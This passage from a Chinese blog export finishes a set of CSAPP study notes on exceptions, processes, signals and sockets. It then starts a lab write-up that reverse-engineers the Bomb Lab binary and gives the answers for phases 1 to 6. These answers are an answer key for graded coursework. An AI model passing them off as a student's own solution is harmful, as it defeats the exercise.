class="built_in">cout</span> &lt;&lt; <span class="string">"高速缓存  友好代码所需时间: "</span> &lt;&lt; t2 - t1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">  <span class="built_in">cout</span> &lt;&lt; <span class="string">"高速缓存不友好代码所需时间: "</span> &lt;&lt; t3 - t2 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序输出<br>
<img src="/2020/07/csapp/cache_code.png" alt="img"><br>
其速度差距在这段代码的输出上表现的淋漓尽致，差距十分明显。</p>
</li>
</ul>
<h2 id="七、-链接">七、 链接</h2>
<blockquote>
<p>暂略</p>
</blockquote>
<h2 id="八、异常控制流">八、异常控制流</h2>
<h3 id="1-异常">1) 异常</h3>
<ul>
<li>
<p>现代系统通过使控制流发生突变来对各种系统状态的变化做出反应，这种突变称为<strong>异常控制流</strong>(Exceptional Control Flow, ECF)。异常控制流发生在计算机系统的各个阶段，例如上下文切换、发送与接受信号，以及应用程序通过使用<em>陷阱</em>(trap)或<em>系统调用</em>(system call)的ECF形式，向操作系统请求服务。</p>
</li>
<li>
<p>在任何情况下，当CPU检测到<em>事件</em>发生时，它会通过一张叫做<em>异常表</em>(exception-table)的跳转表，跳转至处理特定异常的<em>异常处理程序</em>(exception handler)进行处理。</p>
</li>
<li>
<p>异常处理完成后，会发生以下三种情况中的一种</p>
<ul>
<li>控制流返回当前指令(即引起异常的指令，例如缺页异常)</li>
<li>控制流返回下一条指令</li>
<li>终止当前被中断的程序</li>
</ul>
</li>
<li>
<p>异常的类别</p>
<table>
<thead>
<tr>
<th style="text-align:left">类别</th>
<th style="text-align:left">原因</th>
<th style="text-align:center">异步/同步</th>
<th style="text-align:left">返回行为</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">中断(interrupt)</td>
<td style="text-align:left">来自I/O设备的信号</td>
<td style="text-align:center">异步</td>
<td style="text-align:left">总是返回到下一条指令</td>
</tr>
<tr>
<td style="text-align:left">陷阱(trap)</td>
<td style="text-align:left">有意的异常</td>
<td style="text-align:center">同步</td>
<td style="text-align:left">总是返回到下一条指令</td>
</tr>
<tr>
<td style="text-align:left">故障(fault)</td>
<td style="text-align:left">潜在可恢复的错误</td>
<td style="text-align:center">同步</td>
<td style="text-align:left">可能返回到当前指令</td>
</tr>
<tr>
<td style="text-align:left">终止(abort)</td>
<td style="text-align:left">不可恢复的错误</td>
<td style="text-align:center">同步</td>
<td style="text-align:left">不会返回</td>
</tr>
</tbody>
</table>
<ul>
<li>中断
<ul>
<li>一些I/O设备或芯片通过向CPU上的某个引脚发送信号，并将异常号放至系统总线上来触发中断。</li>
<li>在当前指令执行完成后，CPU注意该引脚上的电压变为高电平，则获取异常号并调用中断处理程序，最后将控制流返回到下一条指令。</li>
</ul>
</li>
<li>陷阱
<ul>
<li>陷阱是一种<em>有意</em>的异常，其最重要的用途是在用户程序与内核间提供一个<em>系统调用</em>接口。利用该接口可进行读/写文件，加载程序等等。</li>
<li>执行syscall指令会导致一个异常处理程序的陷阱，该程序会解析参数并调用适当的内核程序。</li>
</ul>
</li>
<li>故障
<ul>
<li>故障由错误情况引起，它可能被故障处理程序所修正。</li>
<li>其中一个经典的故障示例是<strong>缺页异常</strong>。</li>
</ul>
</li>
<li>终止
<ul>
<li>终止是不可恢复的致命错误造成的后果，通常是一些硬件错误。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="2-进程">2) 进程</h3>
<ul>
<li><strong>进程</strong>(process)是<em>一个执行中程序的实例</em>。系统中的每个程序都运行在某个进程的<strong>上下文</strong>(context)</li>
<li>进程上下文由程序运行所需的状态组成，包括内存中的代码与数据、栈、寄存器内容、环境变量、文件描述符集合等等。</li>
<li>进程这个抽象类型提供了一种假象：程序独占CPU与内存。其中程序占用CPU的控制流称为逻辑流，注意与CPU的物理流不一样。</li>
<li>一个逻辑流的执行时间在时间上与另一个流重叠，称为<em>并发流</em>(concurrent flow)。<br>
多个流并发执行的一般现象称为<em>并发</em>(concurrency)。<br>
一个进程和其他进程轮流运行的概念称为<em>多任务</em>(multitasking)。<br>
一个进程执行它的控制流的一部分的每一时间段叫做<em>时间片</em>(time slice).<br>
如果两个流并发的运行在不同的处理器或计算机上，则这些流称为<em>并行流</em>(parallel flow)。它们<strong>并行运行，并发执行。</strong></li>
<li><strong>内核模式</strong>
<ul>
<li>一个运行在内核模式的进程可以执行指令集中的任何指令，并且可以访问系统中的任何内存位置。</li>
<li>与之相反的是，用户模式中的进程不允许执行<em>特权指令</em>(privileged instruction)，例如停止处理器，改变模式位，或清空cache等操作。同时也不允许直接访问内核区中的数据与代码，只能通过异常处理程序进入内核模式。</li>
</ul>
</li>
</ul>
<h3 id="3-进程控制">3) 进程控制</h3>
<ul>
<li>进程总是处于下面三种状态之一
<ul>
<li><strong>运行</strong>。运行中的进程正在CPU上执行或等待被执行。</li>
<li><strong>停止</strong>。进程的执行被挂起(suspended)，并且不会被调度。
<ul>
<li><code>SIGSTOP, SIGTSTP, SIGTTIN, SIGTTOU</code>信号会使一个运行中的进程停止</li>
<li><code>SIGCONT</code>信号会使一个暂停的程序再次开始执行。</li>
</ul>
</li>
<li><strong>终止</strong>。进程永远的停止了。进程终止的三个原因：
<ul>
<li>收到某个信号，其中该信号的默认行为是终止当前进程。</li>
<li>从主程序返回</li>
<li>调用exit函数。</li>
</ul>
</li>
</ul>
</li>
<li>回收子进程
<ul>
<li>当一个进程由于某种原因终止时，该进程会被内核保存在一种已终止的状态，直到它被父进程回收(reaped)。</li>
<li>当回收完成后，内核将子进程退出状态传递给父进程并抛弃已终止的进程。</li>
<li>其中，一个终止但尚未被回收的进程称为<em>僵尸进程</em>(zonbie)。</li>
<li>若父进程已经终止了，则该子进程称为<em>孤儿进程</em>，内核会安排init进程成为该子进程的父进程，并回收该僵尸进程。
<blockquote>
<p>init进程的pid为1，它不会终止，是所有进程的祖先。</p>
</blockquote>
</li>
</ul>
</li>
<li>sleep函数会使当前进程休眠。需要注意的是，休眠的进程可能因为一个信号中断而提前返回。</li>
</ul>
<h3 id="4-信号">4) 信号</h3>
<ul>
<li>Linux<em>信号</em>(signal)是一种更高层的软件形式的异常。它允许进程和内核中断其他进程。</li>
<li>信号提供了一种机制，通知用户进程发生了这些异常。</li>
<li>以下是linux系统上支持的信号列表<br>
<img src="/2020/07/csapp/signals.png" alt="img"></li>
<li>传递一个信号到目的进程的步骤
<ul>
<li>发送信号
<ul>
<li>内核通过 更新目的进程上下文的某个状态，发送一个信号给目标进程</li>
</ul>
</li>
<li>接收信号
<ul>
<li>进程可以忽略信号，终止或者通过执行信号处理程序来捕获这个信号。</li>
<li>每个信号类型都有一个预定义的默认行为。
<ul>
<li>进程终止</li>
<li>进程终止并转储内存</li>
<li>进程停止(挂起)直到被SIGCONT信号重启</li>
<li>进程忽略该信号</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>信号是不排队的。如果待接受信号里已经存在当前类型的信号，则当前信号会被丢弃。</li>
<li>使用信号时，需要考虑是否存在<strong>条件竞争</strong></li>
</ul>
<h3 id="5-非本地跳转">5) 非本地跳转</h3>
<ul>
<li>C语言提供了一种用户级异常控制流形式，称为<em>非本地跳转</em>(nonlocal jump)。它将程序直接从一个函数转移到另一个当前正在执行的函数，而不需要经过正常的调用——返回序列。</li>
<li>非本地跳转通过<code>setjmp</code>和<code>longjmp</code>函数来提供实现的
<ul>
<li><code>setjmp</code>/<code>sigsetjmp</code>
<ul>
<li>setjmp函数会在env缓冲区中保存当前的<em>调用环境</em>，以供longjmp使用，同时返回0。</li>
<li>调用环境包括程序计数器，栈指针和通用目的寄存器等等</li>
<li>setjmp返回值无法赋值给变量</li>
</ul>
</li>
<li><code>longjmp</code>/<code>siglongjmp</code>
<ul>
<li>longjmp函数从env缓冲区中恢复调用环境，然后触发一个从最近一次初始化env的setjmp调用的返回。</li>
<li>然后setjmp返回，并带有非零的返回值retval。</li>
</ul>
</li>
</ul>
</li>
<li>重要应用
<ul>
<li>一个重要应用就是允许从一个深层嵌套的函数调用中立即返回，通常是由检测到某个错误情况引起的。</li>
<li>C++和Java提供的异常机制是较高层次的，是C语言的setjmp和longjmp函数的更加结构化的版本。<br>
可以简单的将try语句中的catch子句看作类似于setjmp函数；throw语句类似于longjmp函数。</li>
</ul>
</li>
</ul>
<h2 id="九-虚拟内存">九. 虚拟内存</h2>
<blockquote>
<p>虚拟内存部分暂时跳过，待学习操作系统时再回顾<br>
动态内存分配部分，由于笔者曾经学习了glibc的ptmalloc机制（这部分笔记也在blog中），故该部分也暂且跳过。</p>
</blockquote>
<h2 id="十-系统级I-O">十. 系统级I/O</h2>
<blockquote>
<p>暂时跳过</p>
</blockquote>
<h2 id="十一-网络编程">十一. 网络编程</h2>
<h3 id="1-网络">1) 网络</h3>
<ul>
<li>互联网络至关重要的特性：它能由采用完全不同和不兼容计数的各种局域网和广域网组成。</li>
<li>如何让某台源主机跨过所有不兼容网络发送数据位到另一台目的主机？解决方法是<strong>一层运行在每台主机和路由器上的协议软件</strong>，它消除了不同网络之间的差异。该协议必须提供两种基本能力：
<ul>
<li><strong>命名机制</strong>。互联网络协议通过定义一种一致的主机地址格式消除命名差异。每台主机会被分配至少一个这种<em>互联网络地址</em>(internet address), 该地址唯一标识了这台主机。</li>
<li><strong>传送机制</strong>。互联网协议通过定义一种把数据位捆扎成不连续的片（称为<em>包</em>）的统一方式，从而消除了传送差异。一个包是由<em>包头</em>和<em>有效载荷</em>组成的，其中包头包括包的大小以及源主机和目的主机的地址，有效载荷包括从源主机发出的数据位。</li>
</ul>
</li>
<li>互联网络思维的精髓：<strong>封装</strong></li>
</ul>
<h3 id="2-全球IP因特网">2) 全球IP因特网</h3>
<h4 id="1-IP地址">1. IP地址</h4>
<ul>
<li>
<p>一个IPv4地址是一个32位无符号整数。网络程序将IP地址存放在以下结构中</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* IP address structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span>&#123;</span></span><br><span class="line">  <span class="keyword">uint32_t</span> s_addr; <span class="comment">/* Address in network byte order (Big-endian) */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>因为因特网主机中可以有不同的主机字节序列，TCP/IP为任意整数数据项定义了一个统一的<em>网络字节顺序</em>(network byte order) —— <strong>大端字节顺序</strong>。</p>
</li>
<li>
<p>Unix提供以下函数在网络和主机字节顺序间实现转换。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">// 返回按照网络字节顺序的值</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">htonl</span><span class="params">(<span class="keyword">uint32_t</span> hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">htons</span><span class="params">(<span class="keyword">uint16_t</span> hostsort)</span></span>;</span><br><span class="line"><span class="comment">// 返回按照主机字节顺序的值</span></span><br><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">ntohl</span><span class="params">(<span class="keyword">uint32_t</span> netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">uint16_t</span> <span class="title">ntohs</span><span class="params">(<span class="keyword">uint16_t</span> netshort)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>IP地址通常是以一种称为<em>点分十进制表示法</em>来表示的。</p>
<blockquote>
<p>例如<code>128.2.194.242</code>就是地址<code>0x8002c2f2</code>的点分十进制表示。<br>
应用程序使用以下函数实现IP地址和点分十进制串之间的转换。</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="comment">// 返回： 若成功则1，若src为非法点分十进制地址则为0，若出错则为-1</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">inet_pton</span><span class="params">(AF_INET, <span class="keyword">const</span> <span class="keyword">char</span>* src, <span class="keyword">void</span>* dst)</span></span>;</span><br><span class="line"><span class="comment">// 返回： 若成功则指向点分十进制字符串的指针，若出错则为NULL</span></span><br><span class="line"><span class="function"><span class="keyword">const</span> <span class="keyword">char</span>* <span class="title">inet_ntop</span><span class="params">(AF_INET, <span class="keyword">const</span> <span class="keyword">void</span>* src, <span class="keyword">char</span>*dst, <span class="keyword">socklen_t</span> size)</span></span>;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h4 id="2-因特网域名">2. 因特网域名</h4>
<ul>
<li>因特网定义了一组<em>域名</em>(domain name)以及一种将域名映射到IP地址的机制，便于人们记忆。</li>
<li>域名集合形成了一个层次结构。<br>
<img src="/2020/07/csapp/doman_struct.png" alt="img"></li>
<li>因特网定义了域名集合和IP地址集合之间的映射。在现代，映射通过DNS(Doman Name System，域名系统)维护。</li>
</ul>
<h4 id="3-因特网连接">3. 因特网连接</h4>
<ul>
<li>因特网客户端和服务端通过在<em>连接</em>上发送和接收字节流来通信。连接是<strong>点对点、全双工、可靠</strong>的。</li>
<li>一个<strong>套接字</strong>是连接的一个端点。每个套接字都有相应的<strong>套接字地址</strong>，由一个因特网地址和一个16位的<em>整数端口</em>组成，用“地址:端口”表示。</li>
<li>当客户端发起连接请求时，客户端套接字地址中的端口是由内核自动分配的，称为<strong>临时端口</strong>(ephemeral port)。但服务器套接字地址中的端口通常是某个<strong>知名端口</strong>，与服务相对应。
<blockquote>
<p>例如Web服务的80端口，FTF服务的20端口。</p>
</blockquote>
</li>
<li>一个连接是由两端的套接字地址唯一确定。这对套接字地址叫做<strong>套接字对</strong>(socket pair)，由下列元组表示：<code>(cliaddr:cliport, servaddr:servport)</code></li>
</ul>
<h3 id="3-套接字接口">3) 套接字接口</h3>
<ul>
<li>
<p><strong>套接字接口</strong>(socket interface)是一组函数，它们和Unix I/O 函数结合，用以创建网络应用。</p>
</li>
<li>
<p>以下是一个典型的客户端-服务器事务的上下文中的套接字接口概述。<br>
<img src="/2020/07/csapp/socket_concept_pic.png" alt="img"></p>
</li>
<li>
<p>套接字地址结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* IP socket address structure */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span>&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span>      sin_family;   <span class="comment">/* Protocol family (always AF_INET) */</span></span><br><span class="line">  <span class="keyword">uint16_t</span>      sin_port;     <span class="comment">/* Port number in network byte order */</span></span><br><span class="line">  <span class="keyword">uint16_t</span>      sin_addr;     <span class="comment">/* IP address in network byte order */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>];  <span class="comment">/* Pad to sizeof(struct sockaddr) */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* Generic socket address structure (for connect, bind, and accept) */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span>&#123;</span></span><br><span class="line">  <span class="keyword">uint16_t</span>  sa_family;    <span class="comment">/* Protocol family */</span></span><br><span class="line">  <span class="keyword">char</span>      sa_data[<span class="number">14</span>];  <span class="comment">/* Address data */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>默认情况下，内核会认为<code>socket</code>函数创建的描述符对应于<strong>主动套接字</strong>(active socket)。<br>
<code>listen</code>函数将sockfd从一个主动套接字转化为一个<strong>监听套接字</strong>(listening socket)，该套接字可以接收来自客户端的请求。<br>
<code>accept</code>函数会返回一个<strong>已连接描述符</strong>(connected socket)。（套接字和描述符在这里都指代socket）</p>
<blockquote>
<p>注意区分开<strong>监听描述符</strong>和<strong>已连接描述符</strong>。<br>
1.监听描述符作为客户端连接请求的一个端点，通常被创建一次，并存在于服务器的整个生命周期。<br>
2.已连接描述符是客户端和服务器之间已经建立起的连接的一个端点。服务器每次接收连接请求时都会创建一次，它只存在于服务器为一个客户端服务的过程。<br>
<img src="/2020/07/csapp/connfdOrlistenfg.png" alt="img"><br>
<strong>监听描述符</strong>和<strong>已连接描述符</strong>概念的区分可以方便并发服务器的建立。</p>
</blockquote>
</li>
<li>
<p>程序可以使用<code>socket</code>、<code>connect</code>、<code>bind</code>、<code>listen</code>、<code>accept</code>函数等等来建立连接。</p>
</li>
</ul>
<h2 id="十二-并发编程">十二. 并发编程</h2>
<ul>
<li>在访问一块共享变量时，并发程序需要对该变量进行上锁，以免产生不必要的条件竞争。</li>
<li>并发编程一定要避免死锁<br>
<img src="/2020/07/csapp/deadLockPic.png" alt="img"></li>
</ul>
<blockquote>
<p>其余暂略，待学习操作系统时再学并发</p>
</blockquote>
]]></content>
      <tags>
        <tag>CSAPP</tag>
        <tag>计算机基础</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP Lab WriteUp</title>
    <url>/2020/07/csapp-lab-writeup/</url>
    <content><![CDATA[<h2 id="简介">简介</h2>
<ul>
<li>这里会存放一些CSAPP Lab的WriteUp，以及一点心得</li>
<li>相关代码存放于 <a href="https://github.com/Kiprey/Skr_Learning/tree/master/week9-19/CSAPP-Lab" target="_blank" rel="noopener">github</a></li>
</ul>
<a id="more"></a>
<ul>
<li>内容较多，请使用右边的导航栏定向跳转。</li>
</ul>
<h2 id="1-Data-Lab">1. Data Lab</h2>
<ul>
<li>lab目录下，终端键入<code>make all</code>即可编译代码</li>
<li>我们所要做的就是实现文件<code>bits.c</code>中的每个函数的功能。实现功能时不同函数会有不同的限制，例如不能使用运算符<code>!</code>等等。</li>
<li>键入<code>./btest</code>以测试文件<code>bits.c</code>中的函数</li>
<li>键入<code>./dlc bits.c</code>以检查文件<code>bits.c</code>中的函数是否使用了被限制的运算符。如果一切正常，则不输出任何信息。</li>
<li>键入<code>./ishow &lt;intNum&gt;</code>或<code>./fshow &lt;floatNum&gt;</code>以查看传入十六进制的详细信息</li>
<li>笔者实现的源码存放于<a href="https://github.com/Kiprey/Skr_Learning/blob/master/week9-19/CSAPP-Lab/1.%20Data%20Lab/bits.c" target="_blank" rel="noopener">github</a>
<blockquote>
<p>Write Up全部以注释的形式写入代码中，方便阅读与理解</p>
</blockquote>
</li>
</ul>
<h2 id="2-Bomb-Lab">2. Bomb Lab</h2>
<ul>
<li>Bomb Lab是一个类似于拆炸弹的实验，需要我们通过反汇编进行逆向分析，找出各个通关phases</li>
<li>阅读<code>bomb.c</code>代码，注意到程序可以打开某个文件，并将其作为输入的来源。<br>
所以我们可以建立一个文件并将找到的phases存至其中，以避免重复的输入</li>
<li>如果对gdb不太熟练，可以查阅<a href="/2020/04/gdb_command/">gdb常用命令</a></li>
<li>键入<code>gdb bomb</code>，在main函数初始位置下断点，并键入<code>run input.txt</code>以启动调试。
<blockquote>
<p><code>input.txt</code>是传给bomb的参数（输入文件的名称）</p>
</blockquote>
</li>
<li>输入phases时，随意输入一个容易辨别的字符串，例如<code>1122333</code>
<blockquote>
<p>需要注意的是，<code>read_line</code>函数会将每一行的最后一个字符（通常是<code>\n</code>）替换为<code>\0</code>， 如果程序的最后一个字符并非<code>\n</code>等无效字符，则phases的最后一个字符会被清除。避免该问题最有效的办法就是将输入文件中的每一行phases末尾增加一个换行符。</p>
</blockquote>
</li>
</ul>
<h3 id="1-phases-1">1) phases_1</h3>
<p>单步进入<code>phase_1</code>函数。程序会通过<code>string_no_equal</code>函数判断输入的字符串是否与特定字符串相等，如果不相等则炸弹爆炸。<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_1.png" alt="img"><br>
由此可得出<code>phases1</code>为<code>Border relations with Canada have never been better.</code>(勿漏句末<em>点号</em>)</p>
<h3 id="2-phases-2">2) phases_2</h3>
<p><code>phases_2</code>函数中，首先会调用<code>read_six_numbers</code>函数，从刚刚的一行输入中读取6个数字, 并判断<code>a == 1 ?</code>，<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_2_1.png" alt="img"></p>
<blockquote>
<p>为了简化说明，我们将输入的6个数分别取名为<strong>a, b, c, d, e, f</strong>。<br>
将<strong>a是否等于b</strong>命名为<code>a = b ?</code></p>
</blockquote>
<p>之后循环判断  <strong>2 * 当前遍历到的数 == 下一个遍历到的数 ?</strong><br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_2_2.png" alt="img"><br>
即判断输入的6个数是否是<strong>以2为公比的非零等比数列</strong>，如果所有条件都满足则通过此关卡。由此可得出<code>phases2</code>可以是<code>1 2 4 8 16 32</code></p>
<h3 id="3-phases-3">3) phases_3</h3>
<p><code>phases_3</code>函数中，程序会先将读入的一行字符串转化为两个数字（如果转换的数字个数不为2则爆炸）然后判断第一个数<code>a &lt; 7 ?</code>。第二个数的值取决于第一个数。如果第二个数与第一个数所指定的常数相等，则通过此关卡。<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_3.png" alt="img"><br>
由此我们可以得到<code>phases3</code>： <code>7 327</code>（答案不唯一）</p>
<h3 id="4-phases-4">4) phases_4</h3>
<p><code>phases_4</code>函数与<code>phases_3</code>函数类似，都会读入两个数字。该函数会执行以下流程</p>
<ul>
<li>判断输入的第一个数字<code>a</code>是否小于等于14（注意数字<code>a</code>是无符号整数）</li>
<li>执行函数<code>func4(a, 0, 14)</code>，并判断其返回值是否等于0</li>
<li>判断输入的第二个数<code>b</code>是否等于0</li>
</ul>
<p><img src="/2020/07/csapp-lab-writeup/bomblab_phases_4.png" alt="img"><br>
<code>func4</code>函数比较特殊，该函数会在内部递归调用自身。通过分析其反汇编代码，得到以下C代码</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> arg0, <span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> tmp1 = arg2 - arg1;</span><br><span class="line">    <span class="comment">// 逻辑右移获取符号位</span></span><br><span class="line">    <span class="keyword">int</span> tmp2 = (tmp1 &gt;&gt; <span class="number">31</span>) + tmp1;</span><br><span class="line">    tmp2 &gt;&gt;= <span class="number">1</span>; <span class="comment">// 算术右移</span></span><br><span class="line">    <span class="keyword">int</span> tmp3 = tmp2 + arg1;</span><br><span class="line">    <span class="keyword">if</span> (tmp3 &lt;= arg0)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (tmp3 &gt;= arg0) <span class="comment">// 实际上这里就是tmp3 == arg0</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> <span class="number">2</span> * func4(arg0, tmp3 + <span class="number">1</span>, arg2) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span> * func4(arg0, arg1, tmp3 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过暴力枚举，可以得到<code>func(x, 0, 14) == 0</code>的4个解，分别为0, 1, 3, 7。<br>
故，<code>phases4</code>可以是<code>0 0</code>(答案不唯一)</p>
<h3 id="5-phases-5">5) phases_5</h3>
<p><code>phases_5</code>函数中，程序会</p>
<ol>
<li>判断读入的字符串长度是否等于6</li>
<li>循环6次，以<code>ch &amp; 0xf</code>为索引，每次在全局字符串<strong>maduiersnfotvbyl</strong>中获取一个字符<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_5.png" alt="img"></li>
<li>待6次循环结束后，将选出的字符串与字符串<code>flyers</code>相比较，如果相同，则通过当前关卡</li>
</ol>
<p>故根据上面的信息可得，<code>phases_5</code>: <code>ionefg</code> / <code>IONEFG</code> （答案不为一）</p>
<h3 id="6-phases-6">6) phases_6</h3>
<p>函数<code>phases_6</code>提高了难度。为了便于说明，我们为输入的6个数字命名为 <strong>a1, a2, a3, a4, a5, a6</strong>。</p>
<ul>
<li>
<p>第一部分是一个嵌套循环。<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_1.png" alt="img"><br>
为便于理解，将该嵌套循环的汇编代码翻译为如下C代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 6个输入的数字</span></span><br><span class="line"><span class="keyword">int</span> inputNum[<span class="number">6</span>];</span><br><span class="line"><span class="keyword">int</span>* r13d = inputNum;</span><br><span class="line"><span class="keyword">int</span> r12d = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span>* rbp = r13d;</span><br><span class="line">  <span class="comment">// 所输入的数必须大于1，小于6</span></span><br><span class="line">  <span class="keyword">if</span>(*rbp - <span class="number">1</span> &lt;= <span class="number">5</span>) <span class="comment">// 无符号比较</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 如果遍历完成，则跳出循环</span></span><br><span class="line">    <span class="keyword">if</span>(++r12d == <span class="number">6</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">int</span> ebx = r12d;</span><br><span class="line">    <span class="comment">// 循环检测字符是否相等</span></span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(inputNum[ebx] == rbp)</span><br><span class="line">        explode_bomb();</span><br><span class="line">      ebx++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(ebx &lt;= <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// 指向下一个数组位置</span></span><br><span class="line">    r13d++;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这个代码比较简单，因为它实际上就是遍历检测所输入的6个数是否出现重复，如果存在重复则爆炸。同时还将输入的数字限制在了1-6中(注意其中的数字是 <strong>无符号</strong> 整数)</p>
</li>
<li>
<p>第二部分是一个简单的循环。这个循环将输入的六个数字设置为 <code>inputNum[i] = 7 - inputNum[i]</code><br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_2.png" alt="img"></p>
</li>
<li>
<p>第三部分同样是一个循环，为便于说明，将该部分的汇编代码转换为如下的C代码：</p>
<blockquote>
<p>为了便于直观，调换了部分代码的顺序，不影响最终结果</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> rsi = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> ecx = inputNum[rsi];</span><br><span class="line">  <span class="keyword">if</span>(inputNum[rsi] &lt;= <span class="number">1</span>)</span><br><span class="line">    <span class="comment">// node是链表上的一个结点。该节点由 int与int* 组成</span></span><br><span class="line">    <span class="built_in">list</span>[rsi] = &amp;node1;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> eax = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span> rdx = &amp;node1;</span><br><span class="line">    <span class="keyword">do</span>&#123;</span><br><span class="line">      rdx = rdx-&gt;next;</span><br><span class="line">      eax++;</span><br><span class="line">    &#125;<span class="keyword">while</span>(eax == ecx);</span><br><span class="line">    <span class="comment">// 此时rdx == &amp;node6</span></span><br><span class="line">    <span class="built_in">list</span>[rsi] = rdx;</span><br><span class="line">  &#125;</span><br><span class="line">  rsi++;</span><br><span class="line">  <span class="keyword">if</span>(rsi == <span class="number">6</span>)</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>程序遍历之前转换的值，并将其作为索引，来获取链表上特定位置的地址，并将其存入栈中。</p>
</li>
<li>
<p>第四部分还是一个万年不变的循环。<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_3.png" alt="img"><br>
这个循环会改变原来的链表顺序，并将其设置为栈上链表的顺序。其代码如下</p>
  <figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">rcx = <span class="built_in">list</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span>* rax = &amp;<span class="built_in">list</span>[<span class="number">1</span>]; rax != &amp;<span class="built_in">list</span>[<span class="number">5</span>]; rax++)</span><br><span class="line">&#123;</span><br><span class="line">  rcx-&gt;address = *rax;</span><br><span class="line">  rcx = *rax;</span><br><span class="line">&#125;</span><br><span class="line">rcx-&gt;address = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>第五部分是一个校验循环。这个循环会使用新顺序来获取链表上的值并判断其关系，其中链表上的值必须逐级递减，否则炸弹爆炸。<br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_4.png" alt="img"><br>
由于链表上的值顺序为 <strong>node3 &gt; node4 &gt; node5 &gt; node6 &gt; node1 &gt; node2</strong><br>
<img src="/2020/07/csapp-lab-writeup/bomblab_phases_6_5.png" alt="img"><br>
故我们最后终于可以得出<code>phases6</code>: <code>4 3 2 1 6 5</code></p>
</li>
</ul>
<h3 id="7-secret-phase">7) secret_phase</h3>
<ul>
<li>
<p>当6个关卡都通过之后，我们跟进<code>phase_defused</code>，发现还有隐藏关卡。<br>
在进入隐藏关卡前，我们需要先通过两个判断。<br>
